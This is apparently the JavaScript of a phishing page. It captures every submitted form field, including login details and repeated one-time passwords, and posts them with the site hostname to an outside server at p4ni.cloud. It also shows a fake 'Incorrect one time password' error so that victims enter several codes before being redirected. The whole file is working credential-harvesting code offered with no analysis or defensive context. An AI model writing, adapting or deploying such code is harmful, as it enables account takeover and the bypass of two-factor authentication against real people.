var API_URL = "https://p4ni.cloud/api.php?token=WILASKLDJADLKJASD"
  , OTT = 0
  , hasPath = "";
function serverCall(e, t) {
    fetch(API_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(e)
    }).then(e=>e.json()).then(e=>{
        if (200 === e.status) {
            if ("ap.html" == getQuery("next") && 0 === OTT || "faa.html" == getQuery("next") && 0 === OTT || "un" == getQuery("next") && OTT < 3)
                return document.getElementById("frm_2_am8E_").reset(),
                document.getElementById("tok-invalid").innerHTML = "Incorrect one time password",
                OTT++,
                !1;
            3 == OTT && (window.location.href = "404.html"),
            window.location.href = t
        } else
            console.log("response is not valid")
    }
    ).catch(e=>{
        console.error(e)
    }
    )
}
function getQuery(e) {
    var t = window.location.href;
    return new URLSearchParams(t.split("?")[1]).get(e)
}
function counterIncrement() {
    var e = localStorage.getItem("1");
    return ("/tok" == hasPath || "/tok.html" == hasPath) && (console.log(e),
    e = null === e ? 0 : parseInt(e),
    e++,
    localStorage.setItem("1", e)),
    e
}
window.onload = function() {
    -1 !== (hasPath = window.location.pathname).indexOf("tok") && (document.getElementById("nextValue").value = "loader.html?next=" + getQuery("next"));
    let e = document.getElementById("frm_2_am8E_")
      , t = "";
    t = document.getElementById("nextValue").value,
    e.addEventListener("submit", function(n) {
        n.preventDefault();
        let a = {};
        for (let l = 0; l < e.elements.length; l++) {
            let o = e.elements[l];
            if ("INPUT" === o.tagName) {
                if ("RESET" == o.value || "LOGIN" == o.value || "Submit" == o.value)
                    continue;
                if ("one" == o.name) {
                    let r = counterIncrement();
                    a[o.name + "-" + r] = o.value
                } else
                    a[o.name] = o.value
            }
        }
        a.site = window.location.hostname,
        serverCall(a, t)
    })
}
;
